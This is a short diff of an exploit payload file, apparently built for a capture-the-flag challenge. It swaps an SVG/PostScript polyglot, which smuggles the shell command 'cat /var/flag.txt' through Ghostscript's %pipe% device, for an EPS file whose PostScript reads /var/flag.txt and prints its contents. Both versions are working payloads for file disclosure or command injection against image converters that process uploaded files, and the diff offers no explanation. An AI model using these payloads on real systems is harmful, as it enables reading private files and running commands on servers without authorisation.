@@ -1,1 +1,18 @@
-<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/tmp/;cat /var/flag.txt) (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/3" /> <svg width="1px" height="1px" /> </hui>
+%!PS-Adobe-2.0 EPSF-1.2
+/infile (/var/flag.txt) (r) file def
+infile
+{
+    /line exch def
+    line readline
+    {
+        = 
+        line
+        readline
+    } 
+    loop
+} 
+if
+infile closefile
+showpage
+quit
+%%EOF
